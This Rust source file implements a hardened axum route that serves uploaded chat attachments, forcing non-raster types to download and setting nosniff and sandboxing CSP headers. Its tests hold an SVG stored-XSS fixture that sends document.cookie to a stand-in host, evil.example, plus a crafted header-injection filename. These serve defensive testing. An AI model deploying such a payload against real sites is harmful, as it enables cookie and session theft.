//! Phase 46.7 Plan 05 (D-06, Rule 2/3 deviation): `GET
//! /chat-attachments/{session_id}/{id}` — raw session-attachment byte
//! serving route.
//!
//! Mirrors `artifact_route.rs`'s raw-axum-handler pattern for the identical
//! reason: the `#[get]`/`#[server]` codec serializes a `Vec<u8>` return as a
//! JSON number array, which would break both the sent-bubble `<img src>`
//! thumbnail (D-06) and the non-image `<a href download>` file chip. This
//! plan's own task text ("add the raw download route beside
//! serve_dioxus_application if needed") anticipates this route — it is not
//! in the plan's `files_modified` frontmatter but is required to satisfy the
//! D-06 sent-bubble/history render acceptance criteria; documented as a
//! deviation in the plan SUMMARY.
//!
//! Security:
//!   - The `id` path segment is the `chat_attachments.id` opaque string
//!     (`catt_<16 hex chars>`, `ironhermes_state::new_attachment_id` — NOT a
//!     UUID, so no `Uuid::parse_str` pre-check applies here unlike
//!     `artifact_route.rs`). Authorization instead comes from resolving the
//!     row via `list_chat_attachments(session_id)` and matching `.id` —
//!     `stored_rel_path` is NEVER taken from the URL or any client input, it
//!     is read back out of the DB row exactly as `upload_attachment` wrote
//!     it (traversal-safe by construction, `safe_attachment_leaf` enforced
//!     at upload time). A `session_id` with no matching attachments simply
//!     returns an empty list — 404, not an error.
//!   - Security review (orchestrator-directed, XSS-via-inline-SVG finding):
//!     the inline-vs-download decision is made from the SNIFFED LEADING
//!     BYTES (`sniff_safe_inline_image` — magic-number allowlist of exactly
//!     png/jpeg/gif/webp), never the stored filename extension or the
//!     upload-time claimed MIME. Everything outside the allowlist —
//!     including `image/svg+xml` (an XML document that may embed `<script>`
//!     and event handlers), html, xml, pdf, and every unknown type — serves
//!     as `application/octet-stream` with `Content-Disposition: attachment`,
//!     forcing a download rather than an inline same-origin render. Only the
//!     four safe raster types get `Content-Disposition: inline` (required
//!     for the `<img src>` D-06 thumbnail to actually display).
//!   - EVERY response (success and error) additionally carries
//!     `X-Content-Type-Options: nosniff` (the browser must honor the
//!     declared type — it can never MIME-sniff an octet-stream body back
//!     into an active document) and [`ATTACHMENT_CSP`] (`default-src
//!     'none'` + `sandbox` — even a body that somehow reached a document
//!     context executes no script and touches no app-origin state). Both
//!     are set in the single `respond` chokepoint, unconditionally, before
//!     any branch — the 46.6 `artifact_route.rs`/`audio_route.rs`
//!     headers-on-every-path precedent.
//!
//! Auth: no explicit gate, matching `artifact_route.rs`/`audio_route.rs`/
//! `ws.rs` — this route runs on operator-local origin without auth
//! middleware.

#[cfg(feature = "server")]
use axum::body::Body;
#[cfg(feature = "server")]
use axum::extract::Path;
#[cfg(feature = "server")]
use axum::http::header::{
    CONTENT_DISPOSITION, CONTENT_SECURITY_POLICY, CONTENT_TYPE, X_CONTENT_TYPE_OPTIONS,
};
#[cfg(feature = "server")]
use axum::http::StatusCode;
#[cfg(feature = "server")]
use axum::response::{IntoResponse, Response};

/// Phase 46.7 Plan 05 (security review): the single authoritative CSP for
/// attachment responses — one const, mirroring `artifact_route.rs`'s
/// `ARTIFACT_CSP` convention (never scattered string concatenation).
///
/// `default-src 'none'` denies every sub-resource load and `sandbox` puts
/// any document context navigated to this URL into an opaque-origin,
/// script-disabled sandbox — so even if a browser ever DID interpret a
/// served body as an active document (SVG/HTML/XML), its scripts cannot
/// run and it cannot touch the app origin's cookies/DOM. `style-src
/// 'unsafe-inline'` keeps a legitimately downloaded-then-viewed file's
/// inline styles rendering if the user opens it standalone.
#[cfg(feature = "server")]
const ATTACHMENT_CSP: &str = "default-src 'none'; style-src 'unsafe-inline'; sandbox";

/// Build a response carrying an explicit, single `Content-Type` +
/// `Content-Disposition` pair — every response, success or error, sets
/// both so no path falls back to axum's default `Content-Type`.
///
/// Phase 46.7 Plan 05 (security review): ALSO sets, unconditionally and
/// before any caller-specific branch can matter, `X-Content-Type-Options:
/// nosniff` (a browser must honor exactly the declared type — it can never
/// MIME-sniff an `application/octet-stream` body back into an active
/// document) and [`ATTACHMENT_CSP`]. This is the single header chokepoint:
/// every return path in this module funnels through here, matching the
/// 46.6 `artifact_route.rs` "CSP on every path, success AND error"
/// precedent.
#[cfg(feature = "server")]
fn respond(
    status: StatusCode,
    content_type: String,
    disposition: String,
    body: Vec<u8>,
) -> Response {
    Response::builder()
        .status(status)
        .header(CONTENT_TYPE, content_type)
        .header(CONTENT_DISPOSITION, disposition)
        .header(X_CONTENT_TYPE_OPTIONS, "nosniff")
        .header(CONTENT_SECURITY_POLICY, ATTACHMENT_CSP)
        .body(Body::from(body))
        .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
}

/// `GET /chat-attachments/{session_id}/{id}` — serve the raw bytes for one
/// uploaded chat attachment.
///
/// Mounted explicitly on the axum router in `main.rs`
/// (`.route("/chat-attachments/{session_id}/{id}", get(serve_chat_attachment))`).
#[cfg(feature = "server")]
pub async fn serve_chat_attachment(Path((session_id, id)): Path<(String, String)>) -> Response {
    // CR-01 (traversal): `session_id` comes straight from the URL path and is
    // joined into `session_attachments_dir(&session_id)` below. Reject any id
    // that could escape sessions/ before the store lookup or the path join.
    if ironhermes_core::safe_session_id(&session_id).is_none() {
        return respond(
            StatusCode::BAD_REQUEST,
            "text/plain; charset=utf-8".to_string(),
            "inline".to_string(),
            b"invalid session id".to_vec(),
        );
    }

    let state = crate::server::state::global_app_state();

    let row = {
        let store = match state.state_store.lock() {
            Ok(s) => s,
            Err(_) => {
                return respond(
                    StatusCode::INTERNAL_SERVER_ERROR,
                    "text/plain; charset=utf-8".to_string(),
                    "inline".to_string(),
                    b"state store unavailable".to_vec(),
                );
            }
        };
        // Resolve via the session-scoped list — `id` is matched against the
        // DB, never trusted directly as a filesystem path (see module doc).
        match store.list_chat_attachments(&session_id) {
            Ok(rows) => rows.into_iter().find(|r| r.id == id),
            Err(_) => {
                return respond(
                    StatusCode::INTERNAL_SERVER_ERROR,
                    "text/plain; charset=utf-8".to_string(),
                    "inline".to_string(),
                    b"attachment lookup failed".to_vec(),
                );
            }
        }
    };

    let Some(row) = row else {
        return respond(
            StatusCode::NOT_FOUND,
            "text/plain; charset=utf-8".to_string(),
            "inline".to_string(),
            b"not found".to_vec(),
        );
    };

    let file_path =
        ironhermes_core::session_attachments_dir(&session_id).join(&row.stored_rel_path);
    let bytes = match std::fs::read(&file_path) {
        Ok(b) => b,
        Err(_) => {
            return respond(
                StatusCode::NOT_FOUND,
                "text/plain; charset=utf-8".to_string(),
                "inline".to_string(),
                b"attachment file missing".to_vec(),
            );
        }
    };

    // Security review: the inline-vs-download decision derives from the
    // SNIFFED BYTES (build_attachment_response), never the stored filename
    // extension or the upload-time claimed MIME — SVG bytes wearing a .png
    // name still download as application/octet-stream.
    build_attachment_response(bytes, &row.filename)
}

/// Phase 46.7 Plan 05 (security review): sniff the leading bytes for one of
/// the four safe-to-render-inline raster image types (png/jpeg/gif/webp).
/// Returns the canonical MIME type on a match, `None` for EVERYTHING else —
/// including `image/svg+xml`, which is an XML *document* that may embed
/// `<script>`/event handlers and must never render inline on the app origin
/// (stored-XSS vector). Sniffed bytes, never the stored filename or claimed
/// MIME, are the authority.
#[cfg(feature = "server")]
fn sniff_safe_inline_image(bytes: &[u8]) -> Option<&'static str> {
    // PNG: 8-byte signature.
    if bytes.starts_with(b"\x89PNG\r\n\x1a\n") {
        return Some("image/png");
    }
    // JPEG: SOI marker + third 0xFF (covers JFIF/EXIF/raw variants).
    if bytes.starts_with(b"\xFF\xD8\xFF") {
        return Some("image/jpeg");
    }
    // GIF: either published signature.
    if bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a") {
        return Some("image/gif");
    }
    // WEBP: RIFF container whose format tag (bytes 8..12) is "WEBP" —
    // a bare RIFF prefix alone (e.g. WAV audio) does NOT match.
    if bytes.len() >= 12 && bytes.starts_with(b"RIFF") && &bytes[8..12] == b"WEBP" {
        return Some("image/webp");
    }
    None
}

/// Phase 46.7 Plan 05 (security review): build the OK response for an
/// attachment's bytes. Safe sniffed raster images render inline; everything
/// else (svg/html/xml/pdf/unknown) is forced to `Content-Disposition:
/// attachment` with `application/octet-stream` so it downloads instead of
/// rendering in the app's own browsing context. All responses additionally
/// carry `X-Content-Type-Options: nosniff` + a neutralizing CSP via
/// [`respond`].
#[cfg(feature = "server")]
fn build_attachment_response(bytes: Vec<u8>, filename: &str) -> Response {
    match sniff_safe_inline_image(&bytes) {
        Some(image_mime) => respond(
            StatusCode::OK,
            image_mime.to_string(),
            "inline".to_string(),
            bytes,
        ),
        None => {
            // Sanitize the filename for the Content-Disposition header
            // (strip quotes/control chars — defense in depth;
            // safe_attachment_leaf already rejected traversal/separator
            // characters at upload time, this only guards the
            // header-injection surface).
            // WR-01: also strip '\\' — a trailing backslash would otherwise
            // escape the closing quote of the quoted-string header value.
            let safe_filename: String = filename
                .chars()
                .filter(|c| !c.is_control() && *c != '"' && *c != '\\')
                .collect();
            respond(
                StatusCode::OK,
                "application/octet-stream".to_string(),
                format!("attachment; filename=\"{safe_filename}\""),
                bytes,
            )
        }
    }
}

#[cfg(all(test, feature = "server"))]
mod xss_hardening_tests {
    use super::*;
    use axum::http::header::{CONTENT_SECURITY_POLICY, X_CONTENT_TYPE_OPTIONS};

    const SVG_BODY: &[u8] =
        b"<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script>document.location='https://evil.example/'+document.cookie</script></svg>";

    // Minimal valid PNG magic prefix (8-byte signature) + junk payload.
    const PNG_BODY: &[u8] = b"\x89PNG\r\n\x1a\nJUNKPAYLOAD";

    fn header<'a>(resp: &'a Response, name: &axum::http::HeaderName) -> Option<&'a str> {
        resp.headers().get(name).and_then(|v| v.to_str().ok())
    }

    /// Security-review requirement 1: EVERY response from this route —
    /// success and error paths alike, all of which funnel through
    /// `respond` — must carry `X-Content-Type-Options: nosniff` and a CSP
    /// whose `sandbox` + `default-src 'none'` directives neutralize script
    /// execution even for inline SVG/HTML bodies.
    #[test]
    fn respond_sets_nosniff_and_csp_unconditionally() {
        let resp = respond(
            StatusCode::NOT_FOUND,
            "text/plain; charset=utf-8".to_string(),
            "inline".to_string(),
            b"not found".to_vec(),
        );
        assert_eq!(
            header(&resp, &X_CONTENT_TYPE_OPTIONS),
            Some("nosniff"),
            "every response must carry X-Content-Type-Options: nosniff"
        );
        let csp = header(&resp, &CONTENT_SECURITY_POLICY)
            .expect("every response must carry a Content-Security-Policy");
        assert!(
            csp.contains("default-src 'none'"),
            "CSP must deny all sources: {csp}"
        );
        assert!(
            csp.contains("sandbox"),
            "CSP must carry the sandbox directive: {csp}"
        );
    }

    /// Security-review requirement 2 (the stored-XSS vector): an uploaded
    /// SVG must NEVER render inline on the app origin — it downloads as an
    /// attachment with the neutralizing headers.
    #[test]
    fn svg_bytes_are_served_as_attachment_with_security_headers() {
        let resp = build_attachment_response(SVG_BODY.to_vec(), "malicious.svg");
        assert_eq!(resp.status(), StatusCode::OK);
        let disposition = header(&resp, &CONTENT_DISPOSITION).expect("disposition required");
        assert!(
            disposition.starts_with("attachment"),
            "SVG must download, never render inline (got: {disposition})"
        );
        let ct = header(&resp, &CONTENT_TYPE).expect("content type required");
        assert_eq!(
            ct, "application/octet-stream",
            "non-safe types serve as octet-stream, never image/svg+xml"
        );
        assert_eq!(header(&resp, &X_CONTENT_TYPE_OPTIONS), Some("nosniff"));
        let csp = header(&resp, &CONTENT_SECURITY_POLICY).expect("CSP required");
        assert!(csp.contains("sandbox"));
    }

    /// Safe raster images (the D-06 `<img src>` thumbnail path) still render
    /// inline — but now with the nosniff+CSP headers present.
    #[test]
    fn png_bytes_serve_inline_with_security_headers() {
        let resp = build_attachment_response(PNG_BODY.to_vec(), "photo.png");
        assert_eq!(resp.status(), StatusCode::OK);
        assert_eq!(header(&resp, &CONTENT_DISPOSITION), Some("inline"));
        assert_eq!(header(&resp, &CONTENT_TYPE), Some("image/png"));
        assert_eq!(header(&resp, &X_CONTENT_TYPE_OPTIONS), Some("nosniff"));
        assert!(header(&resp, &CONTENT_SECURITY_POLICY).is_some());
    }

    /// Security-review requirement 3: type classification comes from the
    /// SNIFFED BYTES, never the stored filename/claimed MIME — SVG bytes
    /// wearing a `.png` name must still be forced to download.
    #[test]
    fn content_type_is_sniffed_from_bytes_not_filename() {
        let resp = build_attachment_response(SVG_BODY.to_vec(), "fake.png");
        let disposition = header(&resp, &CONTENT_DISPOSITION).expect("disposition required");
        assert!(
            disposition.starts_with("attachment"),
            "SVG bytes named .png must still download (got: {disposition})"
        );
        assert_eq!(
            header(&resp, &CONTENT_TYPE),
            Some("application/octet-stream"),
            "claimed .png extension must not grant image/png to SVG bytes"
        );
    }

    /// WR-01: the Content-Disposition filename sanitizer must strip `\\` as
    /// well as `"` and control chars, so a trailing backslash cannot escape
    /// the closing quote of the quoted-string header value.
    #[test]
    fn disposition_filename_strips_backslash_quote_and_control() {
        let resp = build_attachment_response(b"%PDF-1.7 body".to_vec(), "ev\\il\"na\tme.pdf");
        let disposition = header(&resp, &CONTENT_DISPOSITION).expect("disposition required");
        assert!(disposition.starts_with("attachment; filename=\""));
        assert!(
            !disposition.contains('\\'),
            "backslash must be stripped: {disposition}"
        );
        // Only the opening and closing quotes of the quoted-string remain.
        assert_eq!(
            disposition.matches('"').count(),
            2,
            "no interior quotes: {disposition}"
        );
        assert!(
            !disposition.contains('\t'),
            "control chars must be stripped: {disposition}"
        );
    }

    /// The sniffer's allowlist: exactly png/jpeg/gif/webp by magic bytes;
    /// svg/html/pdf/unknown all return None.
    #[test]
    fn sniffer_allowlists_only_the_four_safe_raster_types() {
        assert_eq!(sniff_safe_inline_image(PNG_BODY), Some("image/png"));
        assert_eq!(
            sniff_safe_inline_image(b"\xFF\xD8\xFF\xE0junk"),
            Some("image/jpeg")
        );
        assert_eq!(sniff_safe_inline_image(b"GIF89ajunk"), Some("image/gif"));
        assert_eq!(sniff_safe_inline_image(b"GIF87ajunk"), Some("image/gif"));
        assert_eq!(
            sniff_safe_inline_image(b"RIFF\x00\x00\x00\x00WEBPjunk"),
            Some("image/webp")
        );
        assert_eq!(
            sniff_safe_inline_image(SVG_BODY),
            None,
            "SVG is never inline-safe"
        );
        assert_eq!(sniff_safe_inline_image(b"<!DOCTYPE html><html>"), None);
        assert_eq!(sniff_safe_inline_image(b"%PDF-1.7"), None);
        assert_eq!(sniff_safe_inline_image(b""), None);
        assert_eq!(
            sniff_safe_inline_image(b"RIFF\x00\x00\x00\x00WAVE"),
            None,
            "RIFF alone is not webp"
        );
    }
}
